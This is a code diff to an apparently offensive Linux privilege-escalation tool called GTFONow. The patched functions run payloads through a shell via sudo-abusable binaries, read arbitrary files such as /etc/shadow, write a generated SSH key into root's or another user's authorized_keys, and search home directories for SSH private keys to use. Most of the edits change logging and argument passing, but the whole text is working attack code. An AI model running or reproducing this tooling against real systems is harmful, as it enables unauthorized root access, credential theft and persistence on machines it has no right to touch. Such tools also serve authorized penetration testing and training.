@@ -3329,7 +3329,7 @@ def arbitrary_file_read(binary, payload, auto, user="root", command=None):
     log.info("Performing arbitrary file read with %s", binary)
 
     if is_service_running("ssh"):
-        ssh_key_privesc(payload, user)
+        ssh_key_privesc(payload, user, command)
     if auto:
         return
     print("Enter the file that you wish to read. (eg: /etc/shadow)")
@@ -3438,15 +3438,18 @@ def exploit(binary,  payload, exploit_type, risk, auto, binary_path=None, user="
 
 
 def execute_privileged_command(payload, command):
+    log.debug("Executing %s", payload)
     process = subprocess.Popen(
         payload, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
     process.stdin.write(command + '\n')
-
     out, err = process.communicate()
     if out:
-        print('Output:', out)
+        print(out)
+    if process.returncode == 0:
+        print("Thanks for using GTFONow!")
+        sys.exit()
     if err:
-        print('Error:', err)
+        log.error(err)
 
 
 def get_sudo_l_output():
@@ -3505,8 +3508,7 @@ def check_sudo_binaries(sudo_l_output):
                     "Payloads": payloads,
                     "Type": "Sudo (Needs Password)"
                 }
-            priv_escs = priv_escs + expand_payloads(priv_esc)
-            # priv_escs.append(priv_esc)
+                priv_escs = priv_escs + expand_payloads(priv_esc)
 
     return priv_escs
 
@@ -3816,7 +3818,7 @@ def ssh_write_privesc(payload, user="root", command=None):
         home_dir = "/root"
     else:
         home_dir = "/home/"+user
-    log.info("Attempting to escalate using root's SSH key")
+    log.info("Writing SSH key to %s", home_dir+"/.ssh/authorized_keys")
 
     execute_command("ssh-keygen -N '' -f /tmp/gtfokey")
     with open("/tmp/gtfokey.pub", "r") as f:
@@ -3849,7 +3851,7 @@ def ssh_key_privesc(payload, user="root", command=None):
         home_dir = "/root"
     else:
         home_dir = "/home/"+user
-    log.info("Attempting to escalate using root's SSH key")
+    log.info("Checking for SSH keys in %s", home_dir+"/.ssh/")
 
     for key in key_names:
         path = home_dir+"/.ssh/"+key
